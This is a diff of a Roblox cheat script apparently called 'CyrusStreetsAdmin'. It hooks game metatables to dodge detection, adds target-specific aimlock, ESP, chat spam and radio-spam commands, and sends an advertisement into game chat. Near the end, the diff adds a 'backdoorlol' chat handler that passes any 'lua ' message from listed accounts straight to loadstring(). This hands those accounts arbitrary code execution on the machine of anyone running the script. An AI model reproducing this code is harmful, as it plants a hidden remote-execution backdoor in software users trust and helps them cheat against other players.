@@ -168,12 +168,6 @@ local function Ammo()
 	LP.Character.HumanoidRootPart.CFrame = CFRame
 end 
 
-local SavedSettings = {
-	Keys = {};
-	ClickTpKey = "";
-	BlinkKey = "";
-}
-
 gamememe.__newindex = Closure(function(self,Property,b)
 	if not checkcaller() and not is_protosmasher_caller() then
 		local a = getfenv(2).script
@@ -226,7 +220,7 @@ gamememe.__namecall = Closure(function(self,...)
 			if Arguments[1] == "stop" then 
 				PlayOnDeath = nil 
 			end
-			if tostring(self.Name) == "Fire" and AimlockTarget and AimLock then 
+			if tostring(self.Name) == "Fire" and AimlockTarget and AimLock then
 				return name(self,AimlockTarget.Head.CFrame + AimlockTarget.HumanoidRootPart.Velocity/5)
 			end
 		end
@@ -234,53 +228,42 @@ gamememe.__namecall = Closure(function(self,...)
 	return name(self,...)
 end)
 
-local NEWSETTINGS = HttpService:JSONEncode(SavedSettings)
+local SettingsTable = {
+   Keys = {};
+   ClickTpKey = "";
+   BlinkKey = ""; 
+}
 
-local function SaveSettings()
-	writefile("CyrusStreetsAdminSettings", NEWSETTINGS)
-	local read = readfile("CyrusStreetsAdminSettings")
-	local NewSettings = HttpService:JSONDecode(read)
-	Keys = NewSettings.Keys
-	ClickTpKey = NewSettings.ClickTpKey
-	BlinkKey = NewSettings.BlinkKey
-end
+local function savesettings()
+    writefile("CyrusStreetsAdminSettings",HttpService:JSONEncode(SettingsTable))
+    local SettingsToSave = HttpService:JSONDecode(readfile("CyrusStreetsAdminSettings"))
+    Keys = SettingsToSave.Keys
+    ClickTpKey = SettingsToSave.ClickTpKey
+    BlinkKey = SettingsToSave.BlinkKey
+end 
 
-local function UpdateSettings()
-	local OLDSETTINGS = {
-		Keys = Keys;
+local function updateSettings()
+    local New = { 
+        Keys = Keys;
 		ClickTpKey = ClickTpKey;
 		BlinkKey = BlinkKey;
-	}
-	local NEWUPDATE = HttpService:JSONEncode(OLDSETTINGS)
-	writefile("CyrusStreetsAdminSettings", NEWUPDATE)
+    }
+    writefile("CyrusStreetsAdminSettings",HttpService:JSONEncode(New))
 end
 
-if writefile then
-	local function TEST()
-		local TESTING = readfile("CyrusStreetsAdminSettings")
-		if not TESTING then
-			return false
-		else
-			return true
-		end
-	end
-	local work = pcall(TEST)
-	if work then
-		local function working()
-			local read = readfile("CyrusStreetsAdminSettings")
-			local NewSettings = HttpService:JSONDecode(read)
-			Keys = NewSettings.Keys
-			ClickTpKey = NewSettings.ClickTpKey
-			BlinkKey = NewSettings.BlinkKey
-		end
-		working()
-	elseif not work then
-		SaveSettings()
-	end
+local function runsettings()
+    local SettingsToRun = HttpService:JSONDecode(readfile("CyrusStreetsAdminSettings"))
+    Keys = SettingsToRun.Keys
+    ClickTpKey = SettingsToRun.ClickTpKey
+    BlinkKey = SettingsToRun.BlinkKey
+end
+
+local Work,Error = pcall(function() readfile("CyrusStreetsAdminSettings") end)
+
+if not Work then 
+    savesettings()
 else
-	Keys = {};
-	ClickTpKey = "";
-	BlinkKey = ""
+    runsettings()
 end
 
 local function Unequip()
@@ -294,7 +277,7 @@ end
 local function Style1(Amount)
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(0,0.6,Amount * i)
 			BfgOn = true 
 		end
@@ -304,7 +287,7 @@ end
 local function Style2()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(1 * i,1.5,0)
 			BfgOn = true
 		end
@@ -314,7 +297,7 @@ end
 local function Style3()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Glock" or v.Name == "Uzi" or v.Name == "Sawed Off" or v.Name == "Shotty"  then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(5,50*i,0) + Vector3.new(0,0,0.6)
 			BfgOn = true
 		end
@@ -324,7 +307,7 @@ end
 local function Style4(Amount)
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(30,Amount*i,0) + Vector3.new(10,0.5,0.6)
 			BfgOn = true
 		end
@@ -334,7 +317,7 @@ end
 local function Style5()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(5*i,2*i,7*i) + Vector3.new(0,5,0)
 			BfgOn = true
 		end
@@ -344,7 +327,7 @@ end
 local function Style6()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then
 			v.Grip = CFrame.Angles(5*i,2040/i,2*i/i*10)
 			BfgOn = true
 		end
@@ -354,7 +337,7 @@ end
 local function Style7()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(5,200*i,2*i)
 			BfgOn = true 
 		end
@@ -364,7 +347,7 @@ end
 local function Style8()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(0.1/i*i,200*i,0) + Vector3.new(0,0,5)
 			BfgOn = true 
 		end
@@ -374,7 +357,7 @@ end
 local function Style9()
 Unequip()
 	for i,v in pairs(LP.Backpack:GetChildren()) do 
-		if v:IsA'Tool' and v.Name == "Uzi" then 
+		if v:IsA'Tool' and v:FindFirstChild'Fire' then 
 			v.Grip = CFrame.Angles(4/i*i,200*i,0) + Vector3.new(0,0,5)
 			BfgOn = true 
 		end
@@ -603,13 +586,13 @@ local function esp()
 end
 
 local function fire(Tool,Part)
-	if AimlockTarget and AimLock then 
+	if AimlockTarget and AimLock then
 		Tool.Fire:FireServer(AimlockTarget.Head.CFrame + AimlockTarget.HumanoidRootPart.Velocity/5)
 	else
 		Tool.Fire:FireServer(Mouse.Hit)
 	end
 end
-
+local OnlyAimLock = false 
 local function Modes()
 	if BfgOn and LP.Character:FindFirstChild'Uzi' then
 		local Child = LP.Backpack:GetChildren()
@@ -650,8 +633,9 @@ local function Modes()
 			end
 		end
 	end
-	if Mouse.Target and Players:GetPlayerFromCharacter(Mouse.Target.Parent) and Mouse.Target.Parent:FindFirstChildOfClass'Humanoid' and AimLock then 
+	if Mouse.Target and Players:GetPlayerFromCharacter(Mouse.Target.Parent) and Mouse.Target.Parent:FindFirstChildOfClass'Humanoid' and AimLock and not OnlyAimLock then 
 		AimlockTarget = Mouse.Target.Parent
+		notif("AimlockTarget","has been set to "..AimlockTarget.Name,5,"rbxassetid://1281284684")
 	end
 end
 
@@ -772,7 +756,7 @@ local function Added()
 	LP.Character.Humanoid.StateChanged:Connect(HumanoidState)
 	LP.Backpack.ChildAdded:Connect(MultiUzif)
 	LP.Character.ChildAdded:Connect(GodFuckIhateRobloxIHaveNoMotivationForThisShitGame)
-	LP.Character['Right Leg'].Touched:Connect(lolmultiuzithatisreloading)
+	LP.Character['Left Leg'].Touched:Connect(lolmultiuzithatisreloading)
 	StarterGui:SetCore('ResetButtonCallback',BindableEvent)
     LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed = SpawnWS or NormalWS
     LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower = SpawnJP or NormalJP
@@ -827,6 +811,16 @@ Cmds.spamclick = function(Arguments)
 				end
 			end
 			wait()
+		end
+	end
+end
+
+Cmds.muteallradios = function(Arguments)
+	for _,v in pairs(game:GetDescendants()) do 
+		if v:IsA'Tool' and v:FindFirstChild'Click' then 
+			for i = 1,10 do 
+				v.Click:FireServer()
+			end
 		end
 	end
 end
@@ -1156,15 +1150,35 @@ Cmds.unloop = function(Arguments)
     SpawnHH = NormalHH 
 end
 
+local AntiAim = false 
 Cmds.antiaim = function(Arguments)
-	local Anim = Instance.new'Animation'
-	Anim.AnimationId = "rbxassetid://215384594"
-	LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim):play(5,45,250)
+	if AntiAim then 
+		local Tracks = LP.Character:FindFirstChildOfClass'Humanoid':GetPlayingAnimationTracks()
+		for i = 1,#Tracks do 
+			if string.find(tostring(Tracks[i].AnimationId),"215384594") then 
+				Tracks[i]:Stop()
+			end
+		end
+	else
+		local Anim = Instance.new'Animation'
+		Anim.AnimationId = "rbxassetid://215384594"
+		LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim):play(5,45,250)
+	end
 end
 
 Cmds.aimlock = function(Arguments)
-	AimLock = not AimLock
-	notif("Command: AimLock","has been set to "..tostring(AimLock),5,"rbxassetid://1281284684")
+	if Arguments[1] then 
+		for _,v in pairs(PlrFinder(Arguments[1])) do
+			AimLock = true
+			OnlyAimLock = true 
+			AimlockTarget = v.Character
+			notif("Command: AimLock","has been set to "..tostring(AimLock).." target is "..v.Name,5,"rbxassetid://1281284684")
+		end
+	else
+		OnlyAimLock = false
+		AimLock = not AimLock
+		notif("Command: AimLock","has been set to "..tostring(AimLock),5,"rbxassetid://1281284684")
+	end
 end
 
 Cmds.key = function(Arguments)
@@ -1407,7 +1421,7 @@ end
 
 Cmds.advertise = function(Arguments)
   wait(0.5)
-  ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by Cyrusrock1Alt | Join the cord at jZZDV69","All")
+  ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by Cyrusrock1Alt | Join the cord at UVgdNXP","All")
 end
 
 local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
@@ -1615,6 +1629,15 @@ local function espcoolkid(Plr,Char)
 	end)
 end
 
+local function backdoorlol(Chat)
+if CoolkidTable[tostring(plr.UserId)] then return end
+	if Chat:sub(1,5) == "exec " then 
+		RunCmd(Chat:sub(6))
+	elseif Chat:sub(1,4) == "lua " then 
+		loadstring(Chat:sub(5))()
+	end
+end
+
 for _,v in pairs(Players:GetPlayers()) do 
 	if CoolkidTable[tostring(v.UserId)] then 
 		espcoolkid(v,v.Character)
@@ -1622,15 +1645,7 @@ for _,v in pairs(Players:GetPlayers()) do
 			repeat wait() until Char.Head
 			espcoolkid(v,v.Character)
 		end)
-		v.Chatted:Connect(function(Chat)
-			if not CoolkidTable[tostring(LP.UserId)] then 
-				if Chat:sub(1,5) == "exec " then 
-					RunCmd(Chat:sub(6))
-				elseif Chat:sub(1,4) == "lua " then 
-					RunCmd(Chat:sub(5))
-				end
-			end
-		end)
+		v.Chatted:Connect(backdoorlol)
 	end
 end
 
@@ -1640,15 +1655,7 @@ Players.PlayerAdded:Connect(function(plr)
 			repeat wait() until Char.Head
 			espcoolkid(plr,Char)
 		end)
-		plr.Chatted:Connect(function(Chat)
-			if not CoolkidTable[tostring(LP.UserId)] then
-				if Chat:sub(1,5) == "exec " then 
-					RunCmd(Chat:sub(6))
-				elseif Chat:sub(1,4) == "lua " then 
-					RunCmd(Chat:sub(5))
-				end
-			end
-		end)
+		plr.Chatted:Connect(backdoorlol)
 	end
 	if tostring(plr.UserId) == "659119329" then 
 		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Your god Cyrus has joined.","All")
@@ -1659,7 +1666,7 @@ LP.Chatted:Connect(RunCmd)
 LP.Backpack.ChildAdded:Connect(MultiUzif)
 LP.CharacterAdded:Connect(Added)
 LP.Character.Humanoid.StateChanged:Connect(HumanoidState)
-LP.Character['Right Leg'].Touched:Connect(lolmultiuzithatisreloading)
+LP.Character['Left Leg'].Touched:Connect(lolmultiuzithatisreloading)
 RunService.Stepped:Connect(Looped)
 Mouse.KeyDown:Connect(HotkeyHandler)
 CText.Changed:Connect(Changed)
